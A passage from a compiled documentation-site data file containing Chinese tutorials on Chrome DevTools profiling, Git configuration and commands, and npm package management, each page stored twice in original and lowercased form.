安全：server端要随时准备接收各种恶意攻击，前端则很少。越权操作、数据库攻击等。（登录验证，预防xss攻击和sql注入）\n * 集群和服务拆分：产品发展速度快，流量可能迅速增加。如何通过扩展机器和服务拆分来承载大流量。',charsets:{cjk:!0}},{title:"Chrome的使用",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Chrome%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/常用工具/Chrome的使用.md",key:"v-18909b65",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Chrome%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"使用chrome的性能分析器",slug:"使用chrome的性能分析器",normalizedTitle:"使用chrome的性能分析器",charIndex:16},{level:3,title:"CPU占用分析",slug:"cpu占用分析",normalizedTitle:"cpu占用分析",charIndex:35},{level:3,title:"内存占用分析",slug:"内存占用分析",normalizedTitle:"内存占用分析",charIndex:370}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"使用chrome的性能分析器 CPU占用分析 内存占用分析",content:"# Chrome的使用\n\n\n# 使用chrome的性能分析器\n\n\n# CPU占用分析\n\n# 启动CPU性能分析器\n\n选中 Record JavaScript CPU Profile，点击 Start 按钮或左上角的实心圆点，这个时候Chrome 就会开始记录当前网页的方法的执行。如图1-1所示。\nChrome启用CPU性能分析器\n\n# 结束CPU性能分析器的监控\n\n结束这个性能分析器的监控记录需要点击Stop按钮（或左侧的红色实心圆圈）。如图1-2所示。\n\n\n# 查看CPU性能分析器的记录\n\n结束监控后，在左侧 Profiles 下会列出一个监控结果文件，单击可以打开此监控结果文件。如图1-3所示\n\n监控结果是以数据表格形式展现的。我们可以根据消耗排行，找到Function中提供的函数名，针对性能消耗较大的地方进行优化。\n\n\n# 内存占用分析\n\n# 启动内存分析\n\n选中 Take Heap Snapshot，点击 Take Snapshot 按钮（也可以点击左边黑色实心圆圈），如图2-1所示，\n\n生成的内存快照文件是以数据表格的形式记录了，当前网页对象的个数、所占的内存大小等。\n\n# 内存快照记录\n\n在启动内存分析后，很快就会在左侧的 Profiles 栏目下生成一个当前网页的内存快照记录文件。单击可以查看相关数据，如图2-2所示。\n\n\n# 内存快照分析\n\n在拍完第一个内存快照后，点击左上角的圆点，可以记录一个新的内存快照。单击选择第二个内存快照，可以选择 Comparison 模式对此第二个快照与第一个快照之间的变化。通过分析，对网页进行优化。\n\n",normalizedContent:"# chrome的使用\n\n\n# 使用chrome的性能分析器\n\n\n# cpu占用分析\n\n# 启动cpu性能分析器\n\n选中 record javascript cpu profile，点击 start 按钮或左上角的实心圆点，这个时候chrome 就会开始记录当前网页的方法的执行。如图1-1所示。\nchrome启用cpu性能分析器\n\n# 结束cpu性能分析器的监控\n\n结束这个性能分析器的监控记录需要点击stop按钮（或左侧的红色实心圆圈）。如图1-2所示。\n\n\n# 查看cpu性能分析器的记录\n\n结束监控后，在左侧 profiles 下会列出一个监控结果文件，单击可以打开此监控结果文件。如图1-3所示\n\n监控结果是以数据表格形式展现的。我们可以根据消耗排行，找到function中提供的函数名，针对性能消耗较大的地方进行优化。\n\n\n# 内存占用分析\n\n# 启动内存分析\n\n选中 take heap snapshot，点击 take snapshot 按钮（也可以点击左边黑色实心圆圈），如图2-1所示，\n\n生成的内存快照文件是以数据表格的形式记录了，当前网页对象的个数、所占的内存大小等。\n\n# 内存快照记录\n\n在启动内存分析后，很快就会在左侧的 profiles 栏目下生成一个当前网页的内存快照记录文件。单击可以查看相关数据，如图2-2所示。\n\n\n# 内存快照分析\n\n在拍完第一个内存快照后，点击左上角的圆点，可以记录一个新的内存快照。单击选择第二个内存快照，可以选择 comparison 模式对此第二个快照与第一个快照之间的变化。通过分析，对网页进行优化。\n\n",charsets:{cjk:!0}},{title:"Git的使用",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Git%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/常用工具/Git的使用.md",key:"v-93c798ae",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Git%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"Git和远程代码库",slug:"git和远程代码库",normalizedTitle:"git和远程代码库",charIndex:13},{level:2,title:"Git的安装",slug:"git的安装",normalizedTitle:"git的安装",charIndex:221},{level:2,title:"创建远程代码库",slug:"创建远程代码库",normalizedTitle:"创建远程代码库",charIndex:846},{level:2,title:"关联配置",slug:"关联配置",normalizedTitle:"关联配置",charIndex:1264},{level:2,title:"关联本地和远程的代码库",slug:"关联本地和远程的代码库",normalizedTitle:"关联本地和远程的代码库",charIndex:1810},{level:2,title:"代码提交、拉取、推送",slug:"代码提交、拉取、推送",normalizedTitle:"代码提交、拉取、推送",charIndex:2060},{level:2,title:"分支管理",slug:"分支管理",normalizedTitle:"分支管理",charIndex:2794},{level:2,title:"查看冲突",slug:"查看冲突",normalizedTitle:"查看冲突",charIndex:2496},{level:2,title:"报错信息",slug:"报错信息",normalizedTitle:"报错信息",charIndex:3703}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"Git和远程代码库 Git的安装 创建远程代码库 关联配置 关联本地和远程的代码库 代码提交、拉取、推送 分支管理 查看冲突 报错信息",content:'# Git的使用\n\n\n# Git和远程代码库\n\n    如果需要本地管理代码库可以使用Git，它是一个分布式版本管理工具。如果还要远程代码库帮忙存储，就需要使用GitHub、Gitee、GitLab这样的远程代码管理网站，这些网站都是基于Git的，只是将你的代码帮你存储到远程服务器上。\n    Git的使用可以是shell命令行形式的，叫做Git Bash，当然也可用图形化的Git GUI，还有比较出名的是SourceTree。\n\n\n# Git的安装\n\n只提一下需要注意的地方：\n\n 1. 首先进入Git官网下载页，选择好对应版本后点击下载会很慢，要考虑翻梯子！这个可以看我之前写的爬梯那一篇。\n 2. 安装不选C盘这个应该知道；在“Select Components”的最后一项是“每天都检查Git的更新”，这个注意一下，其他随意。\n 3. 在“Choosing the default editor used by Git”这一步，会选择默认编辑器，我电脑上有NotePad++和VSCode，我选择使用“VSCode”作为默认编辑器。\n 4. 在“Adjusting your PATH environment”这一步，会选择PATH环境，也就是git命令可以在哪里运行；第一个是只在git bash上运行，第二个是也能在windows相关的shell送给你运行，第三个是不止git bash和windows相关的shell，在UNIX命令行上也可以；推荐选第二个。\n 5. 在“Configuring the line ending conversions”这一步，会选择文档末尾以什么格式结束，我使用的是第二个选项。因为前端会使用MD5这个东西，相同内容但不同的末尾格式生成的MD5是不一样的，一定要区分LF和CRLF两种末尾格式，所以最好统一以Unix系统为准（VSCode的右下角也有这个，如果Git设置了，VSCode可以不用设置），如果没这个困扰的可以不用管。\n\n\n# 创建远程代码库\n\n 1. 点击“New repository”，Repository name不需要加个性标记，因为Repository name始终与Owner关联。\n\n 2. Description则是Repository的描述了，一般选Public开源项目，Private是要收费的（Gitee的私有代码库是免费的）。\n\n 3. gitignore是“忽略文件”，可以配置不想push的文件，像*.class、desktop.ini、.vscode这样的无需push到远程代码库。\n\n 4. license是“开源许可证”，有问号说明，根据你的需要选择。大多数选MIT License。\n\n 5. README是Repository里的项目的详细说明。\n\n 6. 点击“Create repository”就创建了新的Repository。\n\n 7. Gitee创建远程代码库跟以上步骤没什么区别，比较方便的是中文显示。\n\n\n# 关联配置\n\n 1. Git和GitHub之间的传输是通过SSH加密传输的，所以我们要先在Git生成ssh key，再把这个ssh key设置到GitHub。\n\n 2. 首先打开Git Bash（没有就先安装Git到本地），输入 ssh-keygen -t rsa -C "邮箱名" ，双引号里的内容是你GitHub的注册邮箱，输入后一直回车，直至出现虚线框。\n\n 3. 去 C:\\Users\\用户名\\.ssh 目录下查找 id_rsa.pub 文件，用txt打开再复制里面的所有内容。\n\n 4. 去GitHub网站，右上角的账户里有Settings，点击打开选择 SSH and GPG keys，再点击 New SSH key，Title随便填，Key则是上一步复制的所有内容，最后生成。\n\n 5. 再回到Git Bash，输入 ssh -T git@github.com 检查是否成功，第一次设置会遇到什么什么（yes/no）？直接输入yes回车，就可以看到授权成功了。\n\n 6. 设置Git的提交用户名和邮箱，输入 git config --global user.name "代码提交人昵称" 和 git config --global user.email "提交邮箱名"\n\n\n# 关联本地和远程的代码库\n\n 1. 首先进入GitHub网站，点击想要关联的Repository，点击Clone or download，拿到远程代码库的git地址（可以是ssh也可以是http）。\n\n 2. 如果本地没有项目，可以使用 git clone git地址 将远程代码库克隆到本地。\n\n 3. 如果本地有项目，而远程是空项目。可以使用 git remote add origin git地址 将本地与远程代码库关联起来。前提示这个本地项目是已经用 git init 进行初始化了。\n\n\n# 代码提交、拉取、推送\n\n 1. 暂存：修改文件后，可以将这些修改后的文件暂存到缓存区，过会准备提交到本地代码库里，使用 git add 文件名 将其暂存。提交所有修改就用 git add .\n\n 2. 提交：修改的文件被暂存后就可以进行提交了，使用 git commit -m "提交备注" 将它们提交到本地代码库。\n\n 3. 撤销：如果修改有问题想反悔，可以用git reset --hard HEAD^ 一个^代表上个版本，两个^代表上上个，一百个就是HEAD~100。\n\n 4. 查看状态：git status 查看状态，git log 查看提交记录，git reflog 查看命令历史（查commit id），可以把 git reset --hard HEAD^ 中的HEAD^替换为commit id来回退。\n\n 5. 拉取代码： 从远程代码库拉取最新代码到本地代码库，可以使用 git pull。新代码与之前本地代码有冲突的话，就要 git difftool 查看冲突，解决完冲突才能进行下一步推送。拉取master分支的内容到此分支 git pull origin master\n\n 6. 推送代码：版本修改完毕要推送到远程代码库上，git push -u origin master 是第一次推送，后面再推送不需要-u，即 git push origin master，如果你不是master分支就 git push origin 分支名。\n\n 7. 有修改但想先拉取代码：先 git stash 将修改缓存，然后 git pull 拉取新代码，最后 git stash pop 缓存还原。参考1，参考2。\n\n 8. 退出一些显示信息，按q。\n\n\n# 分支管理\n\n 1.  列出所有分支：git branch，查看远程的是 git branch -a\n\n 2.  创建分支xxx：git branch xxx\n\n 3.  将当前分支切换到分支xxx：git checkout xxx\n\n 4.  基于当前的分支来创建新分支xxx并切换到这个新分支：git checkout -b xxx\n\n 5.  基于远程分支xxxx来创建新分支xx并切换到这个新分支：git checkout -b xx origin/xxxx\n\n 6.  将分支xxx合并到当前分支：git merge origin/xxx，不合远程的就去掉“origin/”\n\n 7.  删除分支e：git branch -d e，删除不了就强制删除 git branch -D e\n\n 8.  查看哪些分支合并入当前分支：git branch –merged\n\n 9.  查看哪些分支未合并入当前分支：git branch –no-merged\n\n 10. 更新远程库到本地：git fetch origin\n\n\n# 查看冲突\n\n    其实像VSCode编辑器自带的冲突显示已经够了，当然也可以配合使用Beyond Compare来查看冲突代码     在C:\\Users\\用户名下的.gitconfig文件中添加以下文本\n\n[diff]\n    tool = bc4\n[difftool]\n    prompt = false\n[difftool "bc4"]\n    cmd = "\\"D:/Beyond Compare 4/BCompare.exe\\" \\"$LOCAL\\" \\"$REMOTE\\""\n[merge]\n    tool = bc\n[mergetool]\n    prompt = false\n[mergetool "bc4"]\n    cmd = "\\"D:/Beyond Compare 4/BCompare.exe\\" \\"$LOCAL\\" \\"$REMOTE\\" \\"$BASE\\" \\"$MERGED\\""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 报错信息\n\n 1. push时报 fatal: unable to access... 错，可以试一下git config --global http.proxy 和 git config --global --unset http.proxy\n 2. 文件404问题：Git是默认忽略大小写问题的，修改文件夹的大小写上传到Git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 3. git detached HEAD：出现“HEAD detached from 072a7ee”，可以先创建一个新分支保存这个游离的版本 git branch xxx 072a7ee ，然后切回到原分支（这里是切回master） git checkout master ，最后合并xxx和原分支 git merge xxx（将xxx合并到当前分支）。\n 4. Failed to connect to github.com port 443: Timed out问题，为了让连接GitHub稳定，在本地使用了v2rayN。在项目命令行里输入git config --global http.proxy http://127.0.0.1:10809和git config --global https.proxy http://127.0.0.1:10808来配置Git的代理。（如果是shadowsocks，端口号应该是1080，自己打开shadowsocks查看即可）（如果想取消Git代理，git config --global --unset http.proxy和git config --global --unset https.proxy）',normalizedContent:'# git的使用\n\n\n# git和远程代码库\n\n    如果需要本地管理代码库可以使用git，它是一个分布式版本管理工具。如果还要远程代码库帮忙存储，就需要使用github、gitee、gitlab这样的远程代码管理网站，这些网站都是基于git的，只是将你的代码帮你存储到远程服务器上。\n    git的使用可以是shell命令行形式的，叫做git bash，当然也可用图形化的git gui，还有比较出名的是sourcetree。\n\n\n# git的安装\n\n只提一下需要注意的地方：\n\n 1. 首先进入git官网下载页，选择好对应版本后点击下载会很慢，要考虑翻梯子！这个可以看我之前写的爬梯那一篇。\n 2. 安装不选c盘这个应该知道；在“select components”的最后一项是“每天都检查git的更新”，这个注意一下，其他随意。\n 3. 在“choosing the default editor used by git”这一步，会选择默认编辑器，我电脑上有notepad++和vscode，我选择使用“vscode”作为默认编辑器。\n 4. 在“adjusting your path environment”这一步，会选择path环境，也就是git命令可以在哪里运行；第一个是只在git bash上运行，第二个是也能在windows相关的shell送给你运行，第三个是不止git bash和windows相关的shell，在unix命令行上也可以；推荐选第二个。\n 5. 在“configuring the line ending conversions”这一步，会选择文档末尾以什么格式结束，我使用的是第二个选项。因为前端会使用md5这个东西，相同内容但不同的末尾格式生成的md5是不一样的，一定要区分lf和crlf两种末尾格式，所以最好统一以unix系统为准（vscode的右下角也有这个，如果git设置了，vscode可以不用设置），如果没这个困扰的可以不用管。\n\n\n# 创建远程代码库\n\n 1. 点击“new repository”，repository name不需要加个性标记，因为repository name始终与owner关联。\n\n 2. description则是repository的描述了，一般选public开源项目，private是要收费的（gitee的私有代码库是免费的）。\n\n 3. gitignore是“忽略文件”，可以配置不想push的文件，像*.class、desktop.ini、.vscode这样的无需push到远程代码库。\n\n 4. license是“开源许可证”，有问号说明，根据你的需要选择。大多数选mit license。\n\n 5. readme是repository里的项目的详细说明。\n\n 6. 点击“create repository”就创建了新的repository。\n\n 7. gitee创建远程代码库跟以上步骤没什么区别，比较方便的是中文显示。\n\n\n# 关联配置\n\n 1. git和github之间的传输是通过ssh加密传输的，所以我们要先在git生成ssh key，再把这个ssh key设置到github。\n\n 2. 首先打开git bash（没有就先安装git到本地），输入 ssh-keygen -t rsa -c "邮箱名" ，双引号里的内容是你github的注册邮箱，输入后一直回车，直至出现虚线框。\n\n 3. 去 c:\\users\\用户名\\.ssh 目录下查找 id_rsa.pub 文件，用txt打开再复制里面的所有内容。\n\n 4. 去github网站，右上角的账户里有settings，点击打开选择 ssh and gpg keys，再点击 new ssh key，title随便填，key则是上一步复制的所有内容，最后生成。\n\n 5. 再回到git bash，输入 ssh -t git@github.com 检查是否成功，第一次设置会遇到什么什么（yes/no）？直接输入yes回车，就可以看到授权成功了。\n\n 6. 设置git的提交用户名和邮箱，输入 git config --global user.name "代码提交人昵称" 和 git config --global user.email "提交邮箱名"\n\n\n# 关联本地和远程的代码库\n\n 1. 首先进入github网站，点击想要关联的repository，点击clone or download，拿到远程代码库的git地址（可以是ssh也可以是http）。\n\n 2. 如果本地没有项目，可以使用 git clone git地址 将远程代码库克隆到本地。\n\n 3. 如果本地有项目，而远程是空项目。可以使用 git remote add origin git地址 将本地与远程代码库关联起来。前提示这个本地项目是已经用 git init 进行初始化了。\n\n\n# 代码提交、拉取、推送\n\n 1. 暂存：修改文件后，可以将这些修改后的文件暂存到缓存区，过会准备提交到本地代码库里，使用 git add 文件名 将其暂存。提交所有修改就用 git add .\n\n 2. 提交：修改的文件被暂存后就可以进行提交了，使用 git commit -m "提交备注" 将它们提交到本地代码库。\n\n 3. 撤销：如果修改有问题想反悔，可以用git reset --hard head^ 一个^代表上个版本，两个^代表上上个，一百个就是head~100。\n\n 4. 查看状态：git status 查看状态，git log 查看提交记录，git reflog 查看命令历史（查commit id），可以把 git reset --hard head^ 中的head^替换为commit id来回退。\n\n 5. 拉取代码： 从远程代码库拉取最新代码到本地代码库，可以使用 git pull。新代码与之前本地代码有冲突的话，就要 git difftool 查看冲突，解决完冲突才能进行下一步推送。拉取master分支的内容到此分支 git pull origin master\n\n 6. 推送代码：版本修改完毕要推送到远程代码库上，git push -u origin master 是第一次推送，后面再推送不需要-u，即 git push origin master，如果你不是master分支就 git push origin 分支名。\n\n 7. 有修改但想先拉取代码：先 git stash 将修改缓存，然后 git pull 拉取新代码，最后 git stash pop 缓存还原。参考1，参考2。\n\n 8. 退出一些显示信息，按q。\n\n\n# 分支管理\n\n 1.  列出所有分支：git branch，查看远程的是 git branch -a\n\n 2.  创建分支xxx：git branch xxx\n\n 3.  将当前分支切换到分支xxx：git checkout xxx\n\n 4.  基于当前的分支来创建新分支xxx并切换到这个新分支：git checkout -b xxx\n\n 5.  基于远程分支xxxx来创建新分支xx并切换到这个新分支：git checkout -b xx origin/xxxx\n\n 6.  将分支xxx合并到当前分支：git merge origin/xxx，不合远程的就去掉“origin/”\n\n 7.  删除分支e：git branch -d e，删除不了就强制删除 git branch -d e\n\n 8.  查看哪些分支合并入当前分支：git branch –merged\n\n 9.  查看哪些分支未合并入当前分支：git branch –no-merged\n\n 10. 更新远程库到本地：git fetch origin\n\n\n# 查看冲突\n\n    其实像vscode编辑器自带的冲突显示已经够了，当然也可以配合使用beyond compare来查看冲突代码     在c:\\users\\用户名下的.gitconfig文件中添加以下文本\n\n[diff]\n    tool = bc4\n[difftool]\n    prompt = false\n[difftool "bc4"]\n    cmd = "\\"d:/beyond compare 4/bcompare.exe\\" \\"$local\\" \\"$remote\\""\n[merge]\n    tool = bc\n[mergetool]\n    prompt = false\n[mergetool "bc4"]\n    cmd = "\\"d:/beyond compare 4/bcompare.exe\\" \\"$local\\" \\"$remote\\" \\"$base\\" \\"$merged\\""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 报错信息\n\n 1. push时报 fatal: unable to access... 错，可以试一下git config --global http.proxy 和 git config --global --unset http.proxy\n 2. 文件404问题：git是默认忽略大小写问题的，修改文件夹的大小写上传到git远程代码库，将这个远程代码库的build部分部署到服务器上，在访问修改文件夹下的文件时会出现404问题。解决方案：打开本地项目的.git目录下的config文件，修改里面的ignorecase选项为false。\n 3. git detached head：出现“head detached from 072a7ee”，可以先创建一个新分支保存这个游离的版本 git branch xxx 072a7ee ，然后切回到原分支（这里是切回master） git checkout master ，最后合并xxx和原分支 git merge xxx（将xxx合并到当前分支）。\n 4. failed to connect to github.com port 443: timed out问题，为了让连接github稳定，在本地使用了v2rayn。在项目命令行里输入git config --global http.proxy http://127.0.0.1:10809和git config --global https.proxy http://127.0.0.1:10808来配置git的代理。（如果是shadowsocks，端口号应该是1080，自己打开shadowsocks查看即可）（如果想取消git代理，git config --global --unset http.proxy和git config --global --unset https.proxy）',charsets:{cjk:!0}},{title:"Npm的使用",frontmatter:{},regularPath:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Npm%E7%9A%84%E4%BD%BF%E7%94%A8.html",relativePath:"book-web/常用工具/Npm的使用.md",key:"v-548b02db",path:"/book-web/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/Npm%E7%9A%84%E4%BD%BF%E7%94%A8.html",headers:[{level:2,title:"Node.js、Npm是什么",slug:"node-js、npm是什么",normalizedTitle:"node.js、npm是什么",charIndex:13},{level:2,title:"Node.js、Npm的安装",slug:"node-js、npm的安装",normalizedTitle:"node.js、npm的安装",charIndex:372},{level:2,title:"Npm的基础命令",slug:"npm的基础命令",normalizedTitle:"npm的基础命令",charIndex:640},{level:3,title:"创建package.json",slug:"创建package-json",normalizedTitle:"创建package.json",charIndex:653},{level:3,title:"package.json的常用字段",slug:"package-json的常用字段",normalizedTitle:"package.json的常用字段",charIndex:745},{level:3,title:"统一安装所有包",slug:"统一安装所有包",normalizedTitle:"统一安装所有包",charIndex:1338},{level:3,title:"局部安装单个包",slug:"局部安装单个包",normalizedTitle:"局部安装单个包",charIndex:1523},{level:3,title:"全局安装单个包",slug:"全局安装单个包",normalizedTitle:"全局安装单个包",charIndex:1976},{level:3,title:"包安装后的使用",slug:"包安装后的使用",normalizedTitle:"包安装后的使用",charIndex:2140},{level:3,title:"package-lock.json是什么",slug:"package-lock-json是什么",normalizedTitle:"package-lock.json是什么",charIndex:2211},{level:3,title:"查看包的版本",slug:"查看包的版本",normalizedTitle:"查看包的版本",charIndex:2441},{level:3,title:"安装旧版本的包",slug:"安装旧版本的包",normalizedTitle:"安装旧版本的包",charIndex:2853},{level:3,title:"更新包",slug:"更新包",normalizedTitle:"更新包",charIndex:2952},{level:3,title:"卸载包",slug:"卸载包",normalizedTitle:"卸载包",charIndex:3393},{level:3,title:"发布包",slug:"发布包",normalizedTitle:"发布包",charIndex:3441}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"Node.js、Npm是什么 Node.js、Npm的安装 Npm的基础命令 创建package.json package.json的常用字段 统一安装所有包 局部安装单个包 全局安装单个包 包安装后的使用 package-lock.json是什么 查看包的版本 安装旧版本的包 更新包 卸载包 发布包",content:"# Npm的使用\n\n\n# Node.js、Npm是什么\n\n * Node.js是JavaScript的一种运行环境，开源、跨平台、可用于众多流行工具里。\n * 也就是说Node.js可以作为JavaScript在服务器上运行的一种形式，在其标准库中提供了一组异步的 I/O 原生功能（用以防止 JavaScript 代码被阻塞），并且 Node.js 中的库通常是使用非阻塞的范式编写的（从而使阻塞行为成为例外而不是规范）。\n * Node.js 是一个底层的平台，社区在 Node.js 上构建了数千个库，例如：Express、NestJS、Koa、Socket.io等。\n * Npm是 Node.js 标准的软件包管理器，解决Node.js部署的很多问题；可以下载别人写好的程序（包、命令行等），也可以自己写程序发布到Npm上。\n\n\n# Node.js、Npm的安装\n\n * 打开Node.js官网，如果很慢就使用Node.js中文网，选择“Recommended For Most Users（推荐给大多数用户）”，也就是稳定版本。\n * npm包管理工具是同node.js一并安装的，意思是node.js安装好后npm也随之安装到电脑上了。\n * 打开“Git Bash”，没有装Git的可以看一下Git的使用；或者打开cmd，输入node --version可以查看安装的node是什么版本的，输入npm --version可以查看安装的npm是什么版本的。\n\n\n# Npm的基础命令\n\n\n# 创建package.json\n\n    npm init其实是给项目生成package.json，也就是依赖配置文件，里面包含一些项目中的软件包的信息（名称、版本、脚本等）。\n\n\n# package.json的常用字段\n\n字段                说明\nname              设置了应用程序/软件包的名称。\nversion           表明了当前的版本。\ndescription       是应用程序/软件包的简短描述。\nhomepage          是应用程序/软件包的官方网站。\nauthor            是应用程序/软件包的作者。\ncontributors      是应用程序/软件包的其他贡献者。\nmain              设置了应用程序的入口点。\nrepository        应用程序/软件包的存放地方。\nkeywords          关键字。\nprivate           如果设置为 true，则可以防止应用程序/软件包被意外地发布到 npm。\nscripts           定义了一组可以运行的 node 脚本。\ndependencies      设置了作为依赖安装的 npm 软件包的列表。\ndevDependencies   设置了作为开发依赖安装的 npm 软件包的列表。\nengines           设置了此软件包/应用程序在哪个版本的 Node.js 上运行。\nbrowserslist      用于告知要支持哪些浏览器（及其版本）。\n\n\n# 统一安装所有包\n\n如果你的package.json是已经全部配好的那种（你是新加入别人的项目），你就可以直接`npm install”，会将项目所有的依赖自动下载装到 node_modules 文件夹下。\n\n如果遇到npm resource busy or locked.....”报错，可以先清空NPM本地缓存，具体命令就是npm cache clean`。\n\n\n# 局部安装单个包\n\n * 在项目中开发很久了，突然需要某个功能或插件，就可以使用npm install --save-dev xxx（可简写成“-D”）安装单个软件包（省略“--save-dev”也是局部安装），例如：npm install --save-dev typescript。\n * 如果你只是开发环境中使用其实上--save-dev就行，但是如果生产环境也需要某个包，那使用npm install --save xxx（可简写成-S），例如，npm install --save core-js。\n * 在package.json中的体现就是devDependencies和dependencies，可以找个package.json看一下。\n * 如果之前没有区分devDependencies和dependencies，后面加上了devDependencies和dependencies但又上了生产环境，并只想安装dependencies里的包，可以试着加上--production。\n\n\n# 全局安装单个包\n\n像typescript是所有项目都可以用的，可以全局安装，将--save-dev换成--global就行了（可简写成“-g”），例如：npm install -g typescript。\n\n全局包的位置大概在：C:\\Users\\YOU\\AppData\\Roaming\\npm\\node_modules\n\n\n# 包安装后的使用\n\n软件包安装完后可以通过require或import进行使用，如果软件包是可执行文件，可以使用npx xxx来运行。\n\n\n# package-lock.json是什么\n\npackage-lock.json是在npm 5版本时引入的，为了解决“同一项目不同机器上安装的软件包不一致”的问题。引入后用以保证安装的每个包都有确切版本，可以百分百一致复制到另一台机器上。\n\npackage-lock.json 会固化当前安装的每个软件包的版本，npm install时，npm 会使用这些确切的版本，npm update时，会更新package-lock.json文件中软件包的版本。\n\n\n# 查看包的版本\n\n查看本地安装的包的版本：\n\n * npm list：查看局部安装的所有包（包括它们的软件包）的版本。\n * npm list -g：查看全局安装的所有包（包括它们的软件包）的版本。\n * npm list --depth=0：查看局部顶层的软件包，也就是 package.json 中列出的软件包的版本。\n * npm list -g --depth 0：查看全局安装的软件包。\n * npm list xxx：查看xxx软件包安装的版本。\n\n查看远程仓库上包的版本：\n\n * npm view xxx version：查看xxx软件包在Npm远程仓库上最新可用的版本。\n * npm view xxx versions：查看xxx软件包在Npm远程仓库上以前的旧版本\n * npm outdated：查看package.json中列出的软件包在本地和远程的版本信息，列出了一个表进行对比。\n   \n\n\n# 安装旧版本的包\n\n在安装命令的包名后加@再加版本号，例如：npm install cowsay@1.2.0\n\n全局的软件包也可以：npm install -g webpack@4.16.4\n\n\n# 更新包\n\nsemver表示法设置要升级到的版本，例如：\n\n * 〜1.13.0：只更新补丁版本，可以更新到1.13.1，但1.14.0不行；主要用于修复BUG。\n * ^1.13.0：更新补丁版本和次版本，可以更新到1.13.1、1.14.0等；修改的东西要向下兼容。\n * 1.13.0：不更新，一直使用这个版本。\n * >1.13.0：大于这个版本的任何版本都可以；>=、<=、<、||同理。\n * 1.13.0 - 1.15.0：这个范围内的任何版本都可以。\n\n说明：1.13.0，1是主版本（不兼容），13是次版本（向下兼容），0是补丁版本（修复BUG）。\n\n使用npm update来更新所有软件包，使用npm update xxx来更新单个软件包。\n\n有些软件包的主版本使用npm update更新不了，因为可能会引入较大的更改。要强制更新到最新可以使用npm install -g npm-check-updates和ncu -u，再去npm update。\n\n\n# 卸载包\n\n这个很简单，在“安装包”的命令上将install改为uninstall即可。\n\n\n# 发布包\n\n发布npm publish，撤销发布npm unpublish <package>@<version>",normalizedContent:"# npm的使用\n\n\n# node.js、npm是什么\n\n * node.js是javascript的一种运行环境，开源、跨平台、可用于众多流行工具里。\n * 也就是说node.js可以作为javascript在服务器上运行的一种形式，在其标准库中提供了一组异步的 i/o 原生功能（用以防止 javascript 代码被阻塞），并且 node.js 中的库通常是使用非阻塞的范式编写的（从而使阻塞行为成为例外而不是规范）。\n * node.js 是一个底层的平台，社区在 node.js 上构建了数千个库，例如：express、nestjs、koa、socket.io等。\n * npm是 node.js 标准的软件包管理器，解决node.js部署的很多问题；可以下载别人写好的程序（包、命令行等），也可以自己写程序发布到npm上。\n\n\n# node.js、npm的安装\n\n * 打开node.js官网，如果很慢就使用node.js中文网，选择“recommended for most users（推荐给大多数用户）”，也就是稳定版本。\n * npm包管理工具是同node.js一并安装的，意思是node.js安装好后npm也随之安装到电脑上了。\n * 打开“git bash”，没有装git的可以看一下git的使用；或者打开cmd，输入node --version可以查看安装的node是什么版本的，输入npm --version可以查看安装的npm是什么版本的。\n\n\n# npm的基础命令\n\n\n# 创建package.json\n\n    npm init其实是给项目生成package.json，也就是依赖配置文件，里面包含一些项目中的软件包的信息（名称、版本、脚本等）。\n\n\n# package.json的常用字段\n\n字段                说明\nname              设置了应用程序/软件包的名称。\nversion           表明了当前的版本。\ndescription       是应用程序/软件包的简短描述。\nhomepage          是应用程序/软件包的官方网站。\nauthor            是应用程序/软件包的作者。\ncontributors      是应用程序/软件包的其他贡献者。\nmain              设置了应用程序的入口点。\nrepository        应用程序/软件包的存放地方。\nkeywords          关键字。\nprivate           如果设置为 true，则可以防止应用程序/软件包被意外地发布到 npm。\nscripts           定义了一组可以运行的 node 脚本。\ndependencies      设置了作为依赖安装的 npm 软件包的列表。\ndevdependencies   设置了作为开发依赖安装的 npm 软件包的列表。\nengines           设置了此软件包/应用程序在哪个版本的 node.js 上运行。\nbrowserslist      用于告知要支持哪些浏览器（及其版本）。\n\n\n# 统一安装所有包\n\n如果你的package.json是已经全部配好的那种（你是新加入别人的项目），你就可以直接`npm install”，会将项目所有的依赖自动下载装到 node_modules 文件夹下。\n\n如果遇到npm resource busy or locked.....”报错，可以先清空npm本地缓存，具体命令就是npm cache clean`。\n\n\n# 局部安装单个包\n\n * 在项目中开发很久了，突然需要某个功能或插件，就可以使用npm install --save-dev xxx（可简写成“-d”）安装单个软件包（省略“--save-dev”也是局部安装），例如：npm install --save-dev typescript。\n * 如果你只是开发环境中使用其实上--save-dev就行，但是如果生产环境也需要某个包，那使用npm install --save xxx（可简写成-s），例如，npm install --save core-js。\n * 在package.json中的体现就是devdependencies和dependencies，可以找个package.json看一下。\n * 如果之前没有区分devdependencies和dependencies，后面加上了devdependencies和dependencies但又上了生产环境，并只想安装dependencies里的包，可以试着加上--production。\n\n\n# 全局安装单个包\n\n像typescript是所有项目都可以用的，可以全局安装，将--save-dev换成--global就行了（可简写成“-g”），例如：npm install -g typescript。\n\n全局包的位置大概在：c:\\users\\you\\appdata\\roaming\\npm\\node_modules\n\n\n# 包安装后的使用\n\n软件包安装完后可以通过require或import进行使用，如果软件包是可执行文件，可以使用npx xxx来运行。\n\n\n# 